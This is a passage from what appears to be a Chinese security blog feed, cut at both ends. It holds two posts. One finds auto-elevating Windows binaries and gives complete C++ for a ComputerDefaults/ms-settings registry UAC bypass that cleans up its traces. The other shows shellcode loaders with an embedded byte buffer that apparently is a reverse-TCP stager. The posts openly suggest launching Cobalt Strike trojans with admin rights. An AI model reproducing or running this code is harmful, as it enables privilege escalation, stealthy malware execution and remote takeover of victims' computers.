&#123;&#125;&#x27;</span>.format(file))</span><br><span class="line">                success_files.<span class="built_in">append</span>(file)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error when processing file &#123;&#125;: &#123;&#125;&#x27;</span>.format(file, <span class="built_in">str</span>(e)))</span><br><span class="line">    <span class="keyword">return</span> success_files</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    path = <span class="string">&#x27;C:\\Windows\\System32&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Getting .exe files in &#123;&#125;...&#x27;</span>.format(path))</span><br><span class="line">    exe_files = <span class="built_in">get_exe_files</span>(path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Checking auto elevate property for each file...&#x27;</span>)</span><br><span class="line">    success_files = <span class="built_in">check_auto_elevate</span>(exe_files)</span><br><span class="line">    with <span class="built_in">open</span>(<span class="string">&#x27;WhiteList.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">        <span class="keyword">for</span> file in success_files:</span><br><span class="line">            f.<span class="built_in">write</span>(<span class="string">&#x27;&#123;&#125;\n&#x27;</span>.format(file))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Done. Found &#123;&#125; files with auto elevate property.&#x27;</span>.format(<span class="built_in">len</span>(success_files)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>运行上述python代码后，会在其目录下生成一个WhiteList.txt文本文件，用于存放白名单程序的绝对路径，其文本内容如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\bthudtask.exe</span><br><span class="line">C:\Windows\System32\changepk.exe</span><br><span class="line">C:\Windows\System32\ComputerDefaults.exe</span><br><span class="line">C:\Windows\System32\dccw.exe</span><br><span class="line">C:\Windows\System32\dcomcnfg.exe</span><br><span class="line">C:\Windows\System32\DeviceEject.exe</span><br><span class="line">C:\Windows\System32\DeviceProperties.exe</span><br><span class="line">C:\Windows\System32\djoin.exe</span><br><span class="line">C:\Windows\System32\easinvoker.exe</span><br><span class="line">C:\Windows\System32\EASPolicyManagerBrokerHost.exe</span><br><span class="line">C:\Windows\System32\eudcedit.exe</span><br><span class="line">C:\Windows\System32\eventvwr.exe</span><br><span class="line">C:\Windows\System32\fodhelper.exe</span><br><span class="line">C:\Windows\System32\fsquirt.exe</span><br><span class="line">C:\Windows\System32\FXSUNATD.exe</span><br><span class="line">C:\Windows\System32\immersivetpmvscmgrsvr.exe</span><br><span class="line">C:\Windows\System32\iscsicli.exe</span><br><span class="line">C:\Windows\System32\iscsicpl.exe</span><br><span class="line">C:\Windows\System32\lpksetup.exe</span><br><span class="line">C:\Windows\System32\MSchedExe.exe</span><br><span class="line">C:\Windows\System32\msconfig.exe</span><br><span class="line">C:\Windows\System32\msra.exe</span><br><span class="line">C:\Windows\System32\MultiDigiMon.exe</span><br><span class="line">C:\Windows\System32\newdev.exe</span><br><span class="line">C:\Windows\System32\odbcad32.exe</span><br><span class="line">C:\Windows\System32\PasswordOnWakeSettingFlyout.exe</span><br><span class="line">C:\Windows\System32\recdisc.exe</span><br><span class="line">C:\Windows\System32\rrinstaller.exe</span><br><span class="line">C:\Windows\System32\shrpubw.exe</span><br><span class="line">C:\Windows\System32\slui.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesAdvanced.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesComputerName.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesHardware.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesPerformance.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesProtection.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesRemote.exe</span><br><span class="line">C:\Windows\System32\SystemSettingsAdminFlows.exe</span><br><span class="line">C:\Windows\System32\SystemSettingsRemoveDevice.exe</span><br><span class="line">C:\Windows\System32\Taskmgr.exe</span><br><span class="line">C:\Windows\System32\tcmsetup.exe</span><br><span class="line">C:\Windows\System32\TpmInit.exe</span><br><span class="line">C:\Windows\System32\WindowsUpdateElevatedInstaller.exe</span><br><span class="line">C:\Windows\System32\WSReset.exe</span><br><span class="line">C:\Windows\System32\wusa.exe</span><br><span class="line">C:\Windows\System32\Sysprep\sysprep.exe</span><br></pre></td></tr></table></figure>



<p>这里还需注意一点，有个别程序会弹出uac框的，例如changepk.exe，这个程序在windows11不会弹uac，但是在windows10会弹uac</p>
<img src="uac白名单挖掘/image-20230623183142614.png" alt="image-20230623183142614" style="zoom:67%;" />	



<h3 id="2-调用Shell-Open-command键"><a href="#2-调用Shell-Open-command键" class="headerlink" title="2.调用Shell\Open\command键"></a>2.调用<code>Shell\Open\command</code>键</h3><p>打开ProcessMonitor捕捉ComputerDefaults.exe的运行信息，在Filter工具栏设置<code>Process Name</code>为<code>ComputerDefaults.exe</code>，<code>Result</code>设置为<code>NAME NOT FOUND</code></p>
<img src="uac白名单挖掘/image-20230622165530035.png" alt="image-20230622165530035" style="zoom:67%;" />	

<img src="uac白名单挖掘/image-20230622165809092.png" alt="image-20230622165809092" style="zoom:67%;" />	



<p>随后运行ComputerDeafaults，ProcessMonitor立马会显示关于此程序的相关信息</p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165919733.png" alt="image-20230622165919733"></p>
<p>​			</p>
<p>注意此路径<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>, 这行的操作是<code>RegQueryKey</code>，表示查询注册表的一个键</p>
<blockquote>
<p>在注册表中，键相当于目录，它们可以包含其他键（相当于子目录）或键值（相当于文件）。一个键通常不直接包含数据，数据是存储在键值中的</p>
</blockquote>
<img src="uac白名单挖掘/image-20230622194233641.png" alt="image-20230622194233641" style="zoom:67%;" />	



<p>打开注册表，新建上述的键<code>ms-settings\Shell\Open\command</code></p>
<img src="uac白名单挖掘/image-20230622195409277.png" alt="image-20230622195409277" style="zoom:67%;" />	



<p>再用ProcessMonitor捕捉ComputerDefaults的信息，发现它还会去查询<code>DelegateExecute</code>键值，操作为<code>RegQueryValue</code>，表示查询注册表的键值</p>
<blockquote>
<p>在注册表中，键值是存储实际数据的地方，例如，可以在一个键值中存储一个字符串、一个数字或一个二进制数据</p>
</blockquote>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622200928739.png" alt="image-20230622200928739"></p>
<p>在注册表对应的键中添加个键值为<code>DelegateExecute</code>，并将此目录的默认键值设为<code>cmd.exe</code></p>
<blockquote>
<p>Windows注册表中，每个键下面都有一个被称为“默认”或“(默认)”的键值。你可以将其视为该键的默认数据。当你访问一个键而不指定键值的名称时，将返回此默认键值的数据</p>
</blockquote>
<img src="uac白名单挖掘/image-20230622201650750.png" alt="image-20230622201650750" style="zoom:67%;" />	



<p>再次运行ComputerDefaults，会弹出系统管理员权限的cmd，也就是说如果我们将cmd.exe替换成shellcode木马的路径，那么就能获得管理员权限的shell</p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622202206176.png" alt="image-20230622202206176"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由此我们可以总结，在执行ComputerDefaults.exe程序之前，系统会首先检查注册表路径<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>是否存在。如果存在，系统将继续搜索同一目录下是否存在DelegateExecute键值对。</p>
<p>只有在这两个条件都满足的情况下，系统才会执行由<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>路径所指向的exe文件	</p>
<p>还有一点，为何要找HKCU(HKEY_CURRENT_USER)目录下的键值对呢？因为HKCU下的注册表键值不需要管理员权限。HKCU 包含当前登录用户配置信息，每个用户都有其自己的 HKCU，其中的设置可以被用户自由修改，通常不需要额外的管理员权限</p>
<h1 id="bypass的实现"><a href="#bypass的实现" class="headerlink" title="bypass的实现"></a>bypass的实现</h1><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-创建新键"><a href="#1-创建新键" class="headerlink" title="1.创建新键"></a>1.创建新键</h3><p>在 <code>HKEY_CURRENT_USER\Software\Classes</code> 注册表路径下创建一个名为 <code>ms-settings\shell\open\command</code> 的新键（如果该键已存在则打开它）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建或打开注册表键</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, subKey, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to create or open registry key\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-创建键值"><a href="#2-创建键值" class="headerlink" title="2.创建键值"></a>2.创建键值</h3><p>在刚刚创建的键下，创建一个名为 <code>DelegateExecute</code> 的键值，并将其设置为空字符串</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加 &quot;DelegateExecute&quot; 键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>)) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-设置键的默认键值"><a href="#3-设置键的默认键值" class="headerlink" title="3.设置键的默认键值"></a>3.设置键的默认键值</h3><p>设置 <code>ms-settings\shell\open\command</code> 键的默认键值为 <code>filename</code> 变量，这里是 <code>&quot;cmd.exe&quot;</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置默认键值为 &quot;calc.exe&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)filename, <span class="built_in">strlen</span>(filename) + <span class="number">1</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set default registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="4-启动进程"><a href="#4-启动进程" class="headerlink" title="4.启动进程"></a>4.启动进程</h3><p>使用 <code>CreateProcess</code> 函数启动新的进程来执行 <code>&quot;C://windows//system32//cmd.exe&quot;</code> 这个命令，命令参数是 <code>/c C://windows//system32//computerdefaults.exe</code>。当这个命令执行时，它实际上会通过 <code>ms-settings\shell\open\command</code> 注册表键执行 <code>cmd.exe</code>，因为此键的默认键值被设置为 <code>cmd.exe</code>。这个过程就是用户账户控制（UAC）的绕过</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">STARTUPINFO si;  <span class="comment">//进程启动信息</span></span><br><span class="line">	PROCESS_INFORMATION pi;  <span class="comment">//进程信息</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));  <span class="comment">//将结构体si的所有成员都初始化为0</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));  <span class="comment">//将结构体pi的所有成员都初始化为0</span></span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(si);  <span class="comment">//结构体大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">		<span class="string">&quot;C://windows//system32//cmd.exe&quot;</span>,  <span class="comment">//要执行的应用程序名称（包含路径）</span></span><br><span class="line">		(LPSTR)<span class="string">&quot;/c C://windows//system32//computerdefaults.exe&quot;</span>,  <span class="comment">//命令行参数</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//进程句柄不可被继承</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//线程句柄不可被继承</span></span><br><span class="line">		FALSE,  <span class="comment">//不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,  <span class="comment">//标志位为0</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的工作目录</span></span><br><span class="line">		&amp;si,  <span class="comment">//传递启动信息</span></span><br><span class="line">		&amp;pi)  <span class="comment">//传递进程信息</span></span><br><span class="line">		) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess failed (%d).\n&quot;</span>, <span class="built_in">GetLastError</span>());  <span class="comment">//打印错误信息</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放进程句柄和线程句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br></pre></td></tr></table></figure>



<h3 id="5-清理痕迹"><a href="#5-清理痕迹" class="headerlink" title="5.清理痕迹"></a>5.清理痕迹</h3><p>为了清理痕迹，程序等待一段时间后删除 <code>HKEY_CURRENT_USER\Software\Classes\ms-settings</code> 键，删除所有刚刚创建的键和键值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除整个ms-settings目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">RegDeleteTree</span>(HKEY_CURRENT_USER,<span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>) != ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RegDeleteTree Error:%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BypassUac.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">BypassUac</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* subKey = <span class="string">&quot;Software\\Classes\\ms-settings\\shell\\open\\command&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* valueName = <span class="string">&quot;DelegateExecute&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建或打开注册表键</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, subKey, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to create or open registry key\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加 &quot;DelegateExecute&quot; 键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>)) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认键值为 &quot;calc.exe&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)filename, <span class="built_in">strlen</span>(filename) + <span class="number">1</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set default registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO si;  <span class="comment">//进程启动信息</span></span><br><span class="line">	PROCESS_INFORMATION pi;  <span class="comment">//进程信息</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));  <span class="comment">//将结构体si的所有成员都初始化为0</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));  <span class="comment">//将结构体pi的所有成员都初始化为0</span></span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(si);  <span class="comment">//结构体大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">		<span class="string">&quot;C://windows//system32//cmd.exe&quot;</span>,  <span class="comment">//要执行的应用程序名称（包含路径）</span></span><br><span class="line">		(LPSTR)<span class="string">&quot;/c C://windows//system32//computerdefaults.exe&quot;</span>,  <span class="comment">//命令行参数</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//进程句柄不可被继承</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//线程句柄不可被继承</span></span><br><span class="line">		FALSE,  <span class="comment">//不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,  <span class="comment">//标志位为0</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的工作目录</span></span><br><span class="line">		&amp;si,  <span class="comment">//传递启动信息</span></span><br><span class="line">		&amp;pi)  <span class="comment">//传递进程信息</span></span><br><span class="line">		) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess failed (%d).\n&quot;</span>, <span class="built_in">GetLastError</span>());  <span class="comment">//打印错误信息</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放进程句柄和线程句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//删除整个ms-settings目录</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">RegDeleteTree</span>(HKEY_CURRENT_USER,<span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>) != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;RegDeleteTree Error:%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* filename = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">	<span class="built_in">BypassUac</span>(filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>执行程序后返回一个管理员权限的cmd				</p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB.gif" alt="动画"></p>
<p>如果我们将cmd.exe替换成cs木马的地址，那么cs就会以管理员权限上线</p>
<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/%E5%8A%A8%E7%94%BB-16874925352742.gif" alt="动画"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
    <content><![CDATA[<h1 id="去除黑框"><a href="#去除黑框" class="headerlink" title="去除黑框"></a>去除黑框</h1><p>当我们运行Shellcode加载器时会出现如下图所示的黑框，可采用以下方法去除它</p>
<img src="shellcode加载器/image-20230612171819718.png" alt="image-20230612171819718" style="zoom:50%;" />	



<p>将子系统设置为<code>窗口 (/SUBSYSTEM:WINDOWS)</code></p>
<img src="shellcode加载器/image-20230612172009161.png" alt="image-20230612172009161" style="zoom:67%;" />	



<p>将函数入口点设置为<code>mainCRTStartup</code></p>
<img src="shellcode加载器/image-20230612172127151.png" alt="image-20230612172127151" style="zoom:67%;" />	



<h1 id="1-内联汇编加载"><a href="#1-内联汇编加载" class="headerlink" title="1.内联汇编加载"></a>1.内联汇编加载</h1><p>使用内联汇编只能加载32位程序的ShellCode，因为64位程序不支持写内联汇编</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//将data段的内存设置成可读可写可执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ShellCode部分</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x07\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x07\xac\x01\xc7\x38&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x68\xd2\x53\x6e\xfc\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29&quot;</span></span><br><span class="line"><span class="string">&quot;\xc4\x54\x50\x68\x9c\x13\x41\xc4\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x2c\x9b\xfc\xa4\x50\x58\xff\xd5\x97\x6a\x10\x56\x57\x68\xb6\x59\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\xe8\xd9\xce\x36\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x9c\xed\x92\x66\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xe8\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\x36\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x50\x68\x3e\xba\x17\xa3\xff\xd5\x57\x68\xe6\xfc\xe1\xe2\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xfc\xd3\xf4\x5e\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">	__asm &#123;</span><br><span class="line">		lea eax,buf    <span class="comment">// 将buf的地址加载到eax寄存器</span></span><br><span class="line">		call eax  <span class="comment">// 使用call指令跳转到eax寄存器指向的地址（即buf），开始执行shellcode</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="2-使用函数指针加载"><a href="#2-使用函数指针加载" class="headerlink" title="2.使用函数指针加载"></a>2.使用函数指针加载</h1><p>如下代码所示，<code>(void(*)(void))</code>是一个函数指针类型的强制转换, 该函数指针指向一个没有参数且返回值类型为void的函数，也就是说这行代码将 <code>buf</code> 的地址转换为一个函数指针，然后调用该指针所指向的函数，其实这种方法和上述加载方式原理是一样的，只不过这种方法还能用于加载64位的ShellCode</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) <span class="comment">//将data段的内存设置成可读可写可执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ShellCode部分</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x07\x01\xc7\x49\x75\xef\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1\xcf\x07\xac\x01\xc7\x38&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89&quot;</span></span><br><span class="line"><span 